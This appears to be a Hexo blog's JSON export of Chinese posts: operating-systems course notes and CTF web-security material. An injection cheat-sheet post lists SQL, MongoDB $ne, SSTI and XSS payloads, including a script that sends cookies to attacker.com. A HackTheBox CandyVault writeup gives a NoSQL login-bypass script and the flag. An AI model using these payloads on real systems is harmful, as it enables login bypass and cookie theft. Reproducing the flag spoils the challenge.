{"meta":{"title":"Hexo","subtitle":"","description":"hi","author":null,"url":"https://archer-baiyi.github.io","root":"/"},"pages":[{"title":"","date":"2025-03-28T23:35:22.524Z","updated":"2025-03-28T23:33:52.530Z","comments":true,"path":"googlecbf54c20e5418f2c.html","permalink":"https://archer-baiyi.github.io/googlecbf54c20e5418f2c.html","excerpt":"","text":"google-site-verification: googlecbf54c20e5418f2c.html"},{"title":"所有分类","date":"2025-03-03T17:43:08.659Z","updated":"2025-03-03T17:43:08.659Z","comments":true,"path":"categories/index.html","permalink":"https://archer-baiyi.github.io/categories/index.html","excerpt":"","text":""},{"title":"友链","date":"2025-03-09T23:52:24.022Z","updated":"2025-03-09T23:52:24.022Z","comments":true,"path":"friends/index.html","permalink":"https://archer-baiyi.github.io/friends/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2025-03-03T17:42:52.310Z","updated":"2025-03-03T17:42:52.310Z","comments":true,"path":"tags/index.html","permalink":"https://archer-baiyi.github.io/tags/index.html","excerpt":"","text":""},{"title":"","date":"2025-04-05T21:06:21.350Z","updated":"2025-04-05T21:06:21.350Z","comments":true,"path":"about/index.html","permalink":"https://archer-baiyi.github.io/about/index.html","excerpt":"","text":"数学研究生，CTF萌新"}],"posts":[{"title":"代码注入 Injection","slug":"CTF/Web/注入-Injection","date":"2025-04-03T21:24:51.000Z","updated":"2025-04-03T21:53:50.699Z","comments":true,"path":"2025/04/03/CTF/Web/注入-Injection/","permalink":"https://archer-baiyi.github.io/2025/04/03/CTF/Web/%E6%B3%A8%E5%85%A5-Injection/","excerpt":"各种注入漏洞及方法","text":"代码注入代码注入攻击（Code Injection）是指攻击者通过将恶意代码注入到目标系统中执行的行为。这些恶意代码可以用于修改、破坏或窃取系统数据，甚至完全控制目标系统。代码注入攻击（Code Injection）利用了系统在处理输入数据时的弱点，经过精心设计的恶意代码会被误以为是合法的指令而被系统执行，从而导致安全漏洞。 以下是常见的注入类型： 注入类型 注入目标 SQL 注入 数据库查询语句 命令注入 操作系统命令 脚本注入 / XSS 网页脚本（JS） 模板注入（SSTI） 服务器模板语法 LDAP 注入 LDAP 查询语句 XML 注入（XXE） XML 实体/结构 SQL Injection普通1&#x27; OR 1=1 -- MangoDB1234&#123; &quot;email&quot;: &#123;&quot;$ne&quot;: None&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: None&#125;&#125; 模板注入 Server-Side Template Injection（SSTI）服务器端模板注入（Server-side Template Injection，简称SSTI）是指攻击者能够利用模板引擎的原生语法，将恶意代码注入到模板中，而该模板随后会在服务器端被执行。 模板引擎的作用是通过将固定的模板与动态数据结合，来生成网页。当用户输入被直接拼接到模板中（而不是作为数据安全地传入）时，就可能发生服务器端模板注入攻击。这样一来，攻击者可以注入任意的模板指令，从而操控模板引擎，往往最终能完全控制服务器。 Jinja21&#123;&#123; 7*7 &#125;&#125; Mako1$&#123;7*7&#125; PugXSS普通的xss攻击模板： 1&lt;script&gt;fetch(&quot;http://attacker.com?cookie=&quot; + document.cookie); &lt;/script&gt; 123456789&lt;script&gt;alert(1)&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt; &lt;svg onload=alert(1)&gt; &lt;video&gt;&lt;source onerror=alert(1)&gt;&lt;/video&gt;&lt;iframe onload=alert(1)&gt;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"}]},{"title":"GBS 2 Prozess- und Prozessorverwaltung 进程与处理器管理","slug":"TUM笔记/GBS/GBS-2-Prozess-und-Prozessorverwaltung-进程与处理器管理","date":"2025-04-03T21:21:10.000Z","updated":"2025-04-03T21:22:15.634Z","comments":true,"path":"2025/04/03/TUM笔记/GBS/GBS-2-Prozess-und-Prozessorverwaltung-进程与处理器管理/","permalink":"https://archer-baiyi.github.io/2025/04/03/TUM%E7%AC%94%E8%AE%B0/GBS/GBS-2-Prozess-und-Prozessorverwaltung-%E8%BF%9B%E7%A8%8B%E4%B8%8E%E5%A4%84%E7%90%86%E5%99%A8%E7%AE%A1%E7%90%86/","excerpt":"操作系统基础相关笔记","text":"","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"进程","slug":"进程","permalink":"https://archer-baiyi.github.io/tags/%E8%BF%9B%E7%A8%8B/"},{"name":"线程","slug":"线程","permalink":"https://archer-baiyi.github.io/tags/%E7%BA%BF%E7%A8%8B/"}]},{"title":"GBS 3 Parallele Systeme und Synchronisation 并行系统与同步","slug":"TUM笔记/GBS/GBS-3-Parallele-Systeme-und-Synchronisation-并行系统与同步","date":"2025-04-03T21:20:44.000Z","updated":"2025-04-03T21:22:56.389Z","comments":true,"path":"2025/04/03/TUM笔记/GBS/GBS-3-Parallele-Systeme-und-Synchronisation-并行系统与同步/","permalink":"https://archer-baiyi.github.io/2025/04/03/TUM%E7%AC%94%E8%AE%B0/GBS/GBS-3-Parallele-Systeme-und-Synchronisation-%E5%B9%B6%E8%A1%8C%E7%B3%BB%E7%BB%9F%E4%B8%8E%E5%90%8C%E6%AD%A5/","excerpt":"操作系统基础相关笔记","text":"","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"Mutex","slug":"Mutex","permalink":"https://archer-baiyi.github.io/tags/Mutex/"},{"name":"Semaphore","slug":"Semaphore","permalink":"https://archer-baiyi.github.io/tags/Semaphore/"}]},{"title":"GBS 4 Modellierung Paralleler Systeme 并行系统建模","slug":"TUM笔记/GBS/GBS-4-Modellierung-Paralleler-Systeme-并行系统建模","date":"2025-04-03T21:20:18.000Z","updated":"2025-04-06T14:16:36.317Z","comments":true,"path":"2025/04/03/TUM笔记/GBS/GBS-4-Modellierung-Paralleler-Systeme-并行系统建模/","permalink":"https://archer-baiyi.github.io/2025/04/03/TUM%E7%AC%94%E8%AE%B0/GBS/GBS-4-Modellierung-Paralleler-Systeme-%E5%B9%B6%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%BB%BA%E6%A8%A1/","excerpt":"操作系统基础相关笔记","text":"Parallele Systeme并行系统（Parallele Systeme）的一些特性（Eigenschaften）： 确定性（Determinierheit）： 在相同条件下，产生相同的结果。 无干扰性（Störungsfreiheit）： 在遵守既定的并行事件执行顺序的前提下，结果不受影响。 互斥访问资源（Wechselseitiger Ausschluss exklusiv nutzbarerer Ressourcen，mutual exclusion）： 每一时刻最多只有一个进程可以访问共享资源（该资源被独占使用）。 无死锁（Verklemmungsfreiheit，Deadlock free）： 没有多个进程间的循环等待情况。 无饥饿（Kein Verhungern，Starvation free）： 不会有进程因为被一直推迟执行而永远得不到资源。 我们这里主要关注一个用于形式建模的方法：Petri-Netze。 Petri-NetzePetri-Netze主要是关注状态以及状态变化（Zuständen und Zustandsüberg.ngen）。 首先先来看定义： 一个 Petri 网是一个三元组 (S, T, F)，其中： S：有限集合，称为“Stellen”（位置 / 状态） 用圆圈表示。 表示被动元素，例如：存储单元、资源。 T：有限集合，称为“Transitionen”（变迁 / 转换） 用矩形表示。 表示主动元素，例如：处理器、事件、过程。 F：流关系（Flussrelation） $F \\subseteq (S \\times T) \\cup (T \\times S)$ 用有向边（gerichtete Kanten）表示。 并且满足：$S \\cap T = \\emptyset$ 。 每个Knote $x \\in (S \\cup T)$的 Vorbedingung 指的是：$\\bullet x := \\{ \\ y \\ | \\ y \\ F \\ x\\ \\}$，即能到x的点 Nachbedingung 指的是：$ x \\bullet := \\{ \\ y \\ | \\ x \\ F \\ y\\ \\}$，即x能到的点。 例子： 和其他的建图一样，我们这里也可以定义带有标记（即容量，权重等）的图： Kapazität einer Stelle：$c : S \\to \\mathbb{N}_0 \\cup \\{\\infty\\}$ 如果没有专门标记出来，则默认 $\\infty$。 Gewichtung einer Kante：$w : F \\to \\mathbb{N}_0$ 如果没有专门标记出来，则默认 $1$。 一个位置-变迁网（Stellen-Transitionsnetz）里除了上面提到的2个函数还需要一个函数 $M : S \\to \\mathbb{N}_0 \\cup \\{\\infty\\}$ 用于描述图当前的状态（Aktuelle Belegung des Netzes），即每个Stelle里的Token数量。 需要满足 $\\forall s \\in S: M(s) \\leq c(s)$。 一个位置-变迁网（Stellen-Transitionsnetz）叫做Bedingungs/Ereignisnetz 或 Boolesches Netz（布尔网络），当$M : S \\to \\mathbb{B}$ ，也就是说每个Stelle里最多可以有1个Token。 触发规则（Schaltregel）一开始我们就提到，我们的关注点主要是系统的状态以及状态的变化。在前面介绍的内容中，函数 $M$ 被用来描述系统的当前状态，而我们希望通过 $T$（即Transitionen的集合）来描述状态的变化过程。不过，任何状态的变化都必须满足一定的前提条件。那么接下来我们就来看看，在 Petri 网中，这些条件是如何被定义的。 给定一个位置-变迁网（Stellen-Transitionsnetz），即一个Petri-Netz (S, T, F)，函数 $c, w, M$。 一个Transition $t \\in T$ 可以触发（kann schalten）当： $\\forall s \\in \\bullet t: M(s) \\geq w(s, t) $ $\\forall s \\in t\\bullet: M(s) \\leq c(s) - w(t, s)$ 即当： 到 t 的Stelle里有足够的Token（至少 $w(s, t)$ 个） t 能到的所有Stelle里有足够的空位给 $w(t, s)$ 个Token 时才能触发 t 。 这个t触发后整个图的状态会变成$M’$： $\\forall s \\in \\bullet t \\setminus t\\bullet: M’(s) = M(s) - w(s, t)$ $\\forall s’ \\in t\\bullet \\setminus \\bullet t: M’(s’) = M(s’) + w(t, s’)$ $\\forall s’’ \\in \\bullet t \\cap t\\bullet: M’(s’’) = M(s’’) - w(s’’, t) + w(t, s’’)$ 例子： 因为没有专门标记出来，所以默认Kapazität是 $\\infty$，Gewicht是1。 不能Schalten的例子： 因为后面那里已经没有空余的位置了。 这个同样不行，因为这里Schalten需要考虑3个地方： 左边那里是否有足够的（1个）Token来触发t 左边那里是否有足够的空闲位置 右边那里是否有足够的空闲位置 很明显第二点并不满足。 注意，这里不能想着说反正左边的token会在触发 t 的时候被消耗掉所以就有足够的空闲位置！！！ 一定要所有的前提条件都满足了才能触发 t 。 接下来我们来看一下怎么样可以通过建模出来的图判断当前系统的一些属性： 并发性 / 并行性（Nebenläufigkeit，Concurrency）两个Transitionnen $t_0$ 和 $t_1$ 是并发的（nebenläufig），当它们可以互不干扰地独立触发（unabhängig von einander schalten können, ohne sich gegenseitig zu beeinflussen.）。 例子： 可以看到，这里的 $t_1$ 和 $t_2$ 是并发的（nebenläufig），但 $t_1, t_2$ 和 $t_3$ 明显不是，因为 $t_3$ 只有在 $t_1, t_2$ 被触发后才能被触发。 不确定性（Nichtdeterminismus）不确定性表示在给定的标记状态 $M$ 下，可能会出现关于Transitionen可触发性的冲突。 而 $t_0$ 和 $t_1$ 处于冲突中（stehen im Konflikt），当它们共享输入或输出的位置，并且这些位置的 token 数量只能满足其中一个Transition的触发条件。 如果token的数量足够触发所有的Transitionen那就不算有冲突，整个图也是确定的（deterministisch）。 这样会导致进行一次不确定的选择（nichtdeterministische Auswahl）。 例子： 这里的 $t_1$ 和 $t_3$ 冲突了，因为s1里只有1个token，所以要么触发 $t_1$ ，要么触发 $t_3$。 可到达性（Erreichbarkeit）给定一个一个Petri-Netz (S, T, F) ，c，w，以及一个初始状态 $M_0$ 。 那么一个有限序列（endliche Sequenz）$\\rho = t_0, t_1,…, t_n \\ (\\text{with } t_i \\in T)$ 被叫做由 $M_0$ 激活的有限切换序列（von M aktivierteendliche Schaltfolge），当存在 $M_1, M_2,… M_n$ 使得： M_0 \\xrightarrow{t_0} M_1 \\xrightarrow{t_1} \\dots \\xrightarrow{t_n} M_n, \\text{ 即 } M_0 \\xrightarrow{\\rho} M_n如果存在一个有限序列使得 $M$ 能变成 $M’$ ，那么我们就说 $M’$ ist von $M$ erreichbar。 针对这个Erreichbarkeit我们可以再建立个图，叫做 Erreichbarkeitsgraph。里面的点表示 Belegung，有向边表示 Transition。 例子： 它对应的Erreichbarkeitsgraph： 记得左上角的这个有向边一定要画！ 注意：每个Petri-Netz会有着唯一的一个Erreichbarkeitsgraph，但一个Erreichbarkeitsgraph可能会对应很多个Petri-Netz，因为可能存在一些永远无法触发的Transitionen（这些无法触发的Transitionen完全不会改变Erreichbarkeitsgraph）。 Lebendigkeit（liveness）给定一个一个Petri-Netz (S, T, F) ，c，w，以及一个初始状态 $M_0$ 。 它是活跃的（lebendig），当对于所有 $t \\in T$ 都满足以下条件： 对于所有从 $M_0$ 可到达的状态 $M_1$，存在一个后续状态 $M_2$， 使得 $t$ 在 $M_2$ 中可以触发，且 $M_2$ 是从 $M_1$ 可达的，即 \\forall M_1 \\text{ with } M_0 \\xrightarrow{\\rho_1} M_1: \\quad \\exists \\rho_2, M_2 \\text{ s.t. } M_1 \\xrightarrow{\\rho_2} M_2 \\xrightarrow{t}死锁（Verklemmung, Deadlock）给定一个一个Petri-Netz (S, T, F) ，c，w，以及一个初始状态 $M_0$ 。 从 $M_0$ 出发可达的某个标记 $M$，称为完全死锁状态（vollständige Verklemmung），如果在该状态下没有任何Transition $t \\in T$ 可以触发。 如果一个Netz是lebendig的，那么它一定是verklemmungsfrei。（lebendig $\\Rightarrow$ verklemmungsfrei） 但一个Netz是verklemmungsfrei不一定能够说明它也是lebendig的。（verklemmungsfrei $\\nRightarrow$ lebendig ） Verhungern（Starvation），Fariness给定一个一个Petri-Netz (S, T, F) ，c，w，以及一个初始状态 $M_0$ 。 Eine Transaktion t ∈ T verhungert, 当存在一个无线序列使得t尽管处于可触发的状态但是只被触发了有限次。（wenn es eine unendliche Sequenz gibt, in der t trotz Transitionsbereitschaft nur endlich oft auftritt.） 注意这里的前提条件“处于可触发的状态”非常重要，这个如果不满足那么就不能叫verhungert。 一个Netz是公平的（fair）的，当不存在某个无限序列（例如 $t_0 \\to t_4 \\to t_1 \\to \\dots$），使得变迁 $t$ 虽然始终处于可触发状态，却永远没有或只有有限次被实际触发。 所以如果一个Netz是公平的，那么就没有Transition会挨饿（verhungert）。 例子： 这个Netz是不公平的（unfair），因为存在 $t_0 \\to t_0 \\to t_0 \\to \\dots$ ，即 $t_1$ 会挨饿； $t_1 \\to t_1 \\to t_1 \\to \\dots$ ，即 $t_0$ 会挨饿； 例子： 这个图是： nicht lebendig 因为t0只能被触发一次。 deadlockfrei 进到右边那个圈里之后永远都可以有后续操作。 fair 因为t0触发一次之后不可能再进入准备就绪的状态，所以不算挨饿。","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"Petri-Netz","slug":"Petri-Netz","permalink":"https://archer-baiyi.github.io/tags/Petri-Netz/"}]},{"title":"GBS 5 Inter-Prozesskommunikation (IPC) 进程间通信","slug":"TUM笔记/GBS/GBS-5-Inter-Prozesskommunikation-IPC-进程间通信","date":"2025-04-03T21:19:45.000Z","updated":"2025-04-05T14:27:17.393Z","comments":true,"path":"2025/04/03/TUM笔记/GBS/GBS-5-Inter-Prozesskommunikation-IPC-进程间通信/","permalink":"https://archer-baiyi.github.io/2025/04/03/TUM%E7%AC%94%E8%AE%B0/GBS/GBS-5-Inter-Prozesskommunikation-IPC-%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1/","excerpt":"操作系统基础相关笔记","text":"无连接通信（Verbindungslose Kommunikation）无连接通信（Verbindungslose Kommunikation）的通道（Kanäle）可以按照带宽（Bandbreite）分成2种： 窄带通道（Schmalbandige Kanäle） 宽带通道（Breitbandige Kanäle） 窄带通道（Schmalbandige Kanäle）窄带通道（Schmalbandige Kanäle）只传输少量信息（wenige Bits），主要用于事件的通知（Melden von Ereignissen）。它需要同步机制和中断机制（Synchronisationskonzepte und Unterbrechungskonzepte ）来确保通信的可靠性。 Linux里的例子：Signals 进程可以互相发送信号（使用 kill() ） 进程可以显式捕获这些信号（使用 signal() ）： 可以通过注册一个信号处理函数（signal handler）来处理信号 也忽略该信号（使用 SIG_IGN） 如果一个进程没有捕获（abfangen）信号，那么操作系统会终止（beendet）该进程。 SIGKILL 和 SIGSTOP 是不能被捕获的，这些信号会强制终止或暂停进程，进程无法阻止或忽略它们 kill()函数的用法： kill(pid, signal)，其中pid是进程ID，signal是具体要发送的信号，可选的有： 信号名 作用说明 SIGHUP 终端挂起或控制进程终止，常用于重新加载配置 SIGINT 中断（通常来自 Ctrl+C） SIGILL 非法指令，通常是程序错误导致 SIGABRT 异常终止（由 abort() 触发） SIGKILL 强制终止，无法被捕获或忽略 SIGUSR1 用户自定义信号 1 SIGSEGV 段错误（Segmentation Fault） SIGUSR2 用户自定义信号 2 SIGPIPE 管道破裂（写入没有读取端的 pipe） SIGALRM 定时器信号（alarm() 到期触发） SIGTERM 正常终止请求，默认的 kill 信号 SIGCHLD 子进程结束时通知父进程 SIGCONT 恢复被停止的进程 SIGSTOP 强制停止，无法被捕获或忽略 SIGTSTP 终端停止信号（Ctrl+Z） 代码示例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;// 信号处理函数：当接收到信号时执行void sighandler(int sig) &#123; printf(&quot;Caught signal %d\\n&quot;, sig); // 重新注册信号处理器（旧版 signal API 需要这样做） signal(SIGINT, sighandler); // Ctrl+C signal(SIGALRM, sighandler); // alarm() 触发的定时器信号&#125;int main(int argc, char *argv[], char *envp[]) &#123; char buffer[1024]; // 用于存储用户输入 int len; // 注册信号处理函数 signal(SIGINT, sighandler); // 捕获 Ctrl+C signal(SIGALRM, sighandler); // 捕获定时器 alarm 信号 // 设置一个定时器，5 秒后发送 SIGALRM 信号 alarm(5); // 第一阶段：每秒打印一次计数，持续 10 秒 for (len = 0; len &lt; 10; len++) &#123; printf(&quot;Counting %d...\\n&quot;, len); sleep(1); // 每秒暂停 &#125; // 第二次定时器设置，在 10 秒后发送另一个 SIGALRM alarm(10); // 第二阶段：进入一个循环，从标准输入读取用户输入 while (1) &#123; // 从标准输入读取内容（阻塞式） len = read(0, buffer, sizeof(buffer) - 1); if (len == -1) &#123; // 读取失败，打印错误并继续 perror(&quot;read() failed&quot;); continue; &#125; if (len == 0) &#123; // 读到 EOF（比如输入 Ctrl+D），退出程序 printf(&quot;Exiting\\n&quot;); exit(0); &#125; buffer[len] = &#x27;\\0&#x27;; // 添加字符串结尾符 // 如果用户输入的是 &quot;exit&quot;，退出程序 if (!strncmp(buffer, &quot;exit&quot;, 4)) &#123; exit(0); &#125; // 把用户输入的内容原样输出回终端 write(1, buffer, strlen(buffer)); &#125; return 0;&#125; 输出示例： 12345678910111213Counting 0...Counting 1......Counting 4...Caught signal 14 &lt;-- alarm(5) 到时触发 SIGALRMCounting 5......Counting 9...hello, world &lt;-- 用户输入hello, world &lt;-- 程序回显Caught signal 14 &lt;-- alarm(10) 又触发了 SIGALRM^C Caught signal 2 &lt;-- 用户按了 Ctrl+C，触发 SIGINT (signal 2)exit &lt;-- 用户输入 exit，触发退出 宽带通道（Breitbandige Kanäle） 宽带通道（Breitbandige Kanäle）用于传输大量数据，可以根据通信的方式进一步划分为： 隐式通信（Implizite Kommunikation） 显式通信（Explizite Kommunikation） 隐式通信（Implizite Kommunikation）隐式通信（Implizite Kommunikation）是通过共享资源实现的，比如说内存、寄存器、文件、环形缓冲区等。 优点：简单快速，因为不需要不需要在不同地址空间（Adressräumen）之间复制数据。 缺点：不一定一直都有共享区域可以用；可能会出现 busy-waiting，所以需要额外的同步机制。 （第三章的内容就是在讲这个） 显式通信（Explizite Kommunikation）显式通信（Explizite Kommunikation）则是我们比较熟悉的：发送/接收信息。适用于地址空间（Adressräumen）分离的进程（比如两个互不相干的进程），不过是与操作系统的直接交互。 这种通信可以是本地的也可以是远程的。 一般信息由2部分组成： 消息头（Nachrichtenkopf，header）：包含管理信息，比如说发送者、接收者的标识、消息大小等。 消息体（Nachrichtenkörper）：有效载荷（payload），也就是真正的信息内容。 流程： 进程使用 send() 发送消息 操作系统的消息服务负责传递该消息 接收方进程使用 recv() 接收该消息 而显式通信（Explizite Kommunikation） 又可以进一步划分为： 同步通信（Synchrone Kommunikation） 异步通信（Asynchrone Kommunikation） 这其中又有2种消息通信的模式（Muster）： 消息通知（Meldung） 是单向的（unidirectional），通常只是传递少量数据，比如说通知状态变化。 任务（Auftrag） 是双向的（bidirectional），比如说查询某些数据，请求发送后收到包含数据的响应。 Asynchron的优点： 在实时系统中非常有用，当发送进程不能被阻塞时； 允许发送方和接收方并行处理任务； 适合用于事件的通知/信号传递。 Asynchron的缺点： 操作系统有管理负担（需要消息缓冲区来存储异步数据） 错误处理更复杂： 无法直接通知发送方是否成功； 数据包可能丢失（当缓冲区满了，尤其是网络通信中）； 有时需要重传数据包。 在实际应用中，异步通信更常用，特别适用于不确定接收方是否在线、或者无法预测响应时间的情况。 可以使用线程来结合同步与异步通信（比如：主线程同步处理、子线程异步等待）。 Asynchrone Meldung只发不等 Synchrone Meldung 等待对方确认收到 流程： 接收方在收到消息后会发送一个确认（Bestätigung） 发送方在发送完消息后会等待接收确认（Empfangsbestätigung） 确认消息不包含实际数据，仅用于同步。 另一种方法：Rendezvous-Verfahren： 在交换消息之前，发送方与接收方都要事先准备好进行发送和接收 这样一来消息不需要缓冲 Asynchrone Auftrag 各发各的 任务（Auftrag）和结果（Resultat）是作为两个独立的消息发送的。 Synchrone Auftrag 等待对方回复 Streams流（Stream）是对连接（Verbindung）的一种抽象。 消息在传输过程中被缓冲，所有消息被整合为逻辑上的字节流（byte stream）。 操作系统可以建立/关闭连接，或者是在流中进行读/写操作。 C++头文件中的 1#include &lt;iostream&gt; 指的就是这个。 而管道（Pipes）正是流（Stream）的实现。 管道是一个单向的流（unidirektionaler Strom）。双向通信可以用两个管道来模拟。管道实现先进先出（FIFO） 的数据传输模型。 管道（Pipes）一般分为2种： （匿名）管道 pipe() 函数会创建一个管道，它返回两个文件描述符，分别用于读和写。 可以在 fork() 创建子进程时，把其中一端交给子进程，实现进程间通信，或者在不同的线程之间使用。 命名管道（Named Pipes） 用于多个进程之间的通信，它们有自己的名字，在文件系统中可见。 代码示例： 123456789int main() &#123; int p[2]; // p[0]: 读端, p[1]: 写端 pipe(p); // 创建一个匿名管道 sendData(p[1]); // 写数据到管道 receiveData(p[0]); // 从管道中读取数据 return 0;&#125; 1234567891011void sendData(int fd) &#123; const char *msg = &quot;Hello, world&quot;; // 要发送的消息 uint16_t len = strlen(msg); // 消息长度（不含 \\0） uint16_t nLen = htons(len); // 转换为网络字节序（大端） // 先发送长度，确保接收端知道后面要读取多少字节 send(fd, &amp;nLen, sizeof(nLen), 0); // 再发送消息本体 send(fd, msg, len, 0);&#125; 123456789101112131415void receiveData(int fd) &#123; char msg[1024]; // 接收缓冲区 uint16_t nLen; // 网络字节序长度 uint16_t len; // 主机字节序长度 // 先接收长度信息（2字节） recv(fd, &amp;nLen, sizeof(nLen), 0); len = ntohs(nLen); // 转换为主机字节序 // 接收实际消息内容（len 字节） recv(fd, msg, len, 0); msg[len] = &#x27;\\0&#x27;; // 手动加上字符串结束符 printf(&quot;接收到 %u 字节：%s\\n&quot;, len, msg);&#125;","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"synchron","slug":"synchron","permalink":"https://archer-baiyi.github.io/tags/synchron/"},{"name":"asynchron","slug":"asynchron","permalink":"https://archer-baiyi.github.io/tags/asynchron/"},{"name":"signal","slug":"signal","permalink":"https://archer-baiyi.github.io/tags/signal/"}]},{"title":"HTB CandyVault Writeup","slug":"CTF/Web/HTB-CandyVault-Writeup","date":"2025-04-03T10:49:04.000Z","updated":"2025-04-03T10:57:36.233Z","comments":true,"path":"2025/04/03/CTF/Web/HTB-CandyVault-Writeup/","permalink":"https://archer-baiyi.github.io/2025/04/03/CTF/Web/HTB-CandyVault-Writeup/","excerpt":"","text":"题目描述 （有附件） 观察打开网页： 查看源代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from flask import Flask, Blueprint, render_template, redirect, jsonify, requestfrom flask_bcrypt import Bcryptfrom pymongo import MongoClientapp = Flask(__name__)app.config.from_object(&quot;application.config.Config&quot;)bcrypt = Bcrypt(app)client = MongoClient(app.config[&quot;MONGO_URI&quot;])db = client[app.config[&quot;DB_NAME&quot;]]users_collection = db[&quot;users&quot;]@app.errorhandler(Exception)def handle_error(error): message = error.description if hasattr(error, &quot;description&quot;) else [str(x) for x in error.args] response = &#123; &quot;error&quot;: &#123; &quot;type&quot;: error.__class__.__name__, &quot;message&quot;: message &#125; &#125; return response, error.code if hasattr(error, &quot;code&quot;) else 500@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index(): return render_template(&quot;index.html&quot;)@app.route(&quot;/login&quot;, methods=[&quot;POST&quot;])def login(): content_type = request.headers.get(&quot;Content-Type&quot;) if content_type == &quot;application/x-www-form-urlencoded&quot;: email = request.form.get(&quot;email&quot;) password = request.form.get(&quot;password&quot;) elif content_type == &quot;application/json&quot;: data = request.get_json() email = data.get(&quot;email&quot;) password = data.get(&quot;password&quot;) else: return jsonify(&#123;&quot;error&quot;: &quot;Unsupported Content-Type&quot;&#125;), 400 user = users_collection.find_one(&#123;&quot;email&quot;: email, &quot;password&quot;: password&#125;) if user: return render_template(&quot;candy.html&quot;, flag=open(&quot;flag.txt&quot;).read()) else: return redirect(&quot;/&quot;) 发现使用了MongoDB进行验证： 1234user = users_collection.find_one(&#123;&quot;email&quot;: email, &quot;password&quot;: password&#125;) if user: return render_template(&quot;candy.html&quot;, flag=open(&quot;flag.txt&quot;).read()) 如果在数据库里找到了对应的用户信息则登陆成功返回flag。 渗透利用MongoDB的漏洞进行注入。我们发送以下内容： 123456789101112131415import requestsurl = &quot;http://94.237.53.247:51317/login&quot;payload = &#123; &quot;email&quot;: &#123;&quot;$ne&quot;: None&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: None&#125;&#125;response = requests.post(url, json=payload)print(&quot;Response Body:\\n&quot;, response.text)# &lt;body&gt;# &lt;p data-text=&quot;HTB&#123;s4y_h1_t0_th3_c4andy_v4u1t!&#125;&quot;&gt;HTB&#123;s4y_h1_t0_th3_c4andy_v4u1t!&#125;&lt;/p&gt;# &lt;/body&gt; 这样一来MongoDB里的查询会被解释成： 1&#123;&quot;email&quot;: &#123;&quot;$ne&quot;: null&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: null&#125;&#125; 也就是说会查找 email 不为 null 且 password 不为 null 的任意用户。这样便可以绕过登录验证。 得到flag：HTB{s4y_h1_t0_th3_c4andy_v4u1t!} 。 也可以发送： 1234payload = &#123; &quot;email&quot;: &#123;&quot;$ne&quot;: 0&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: 0&#125;&#125; 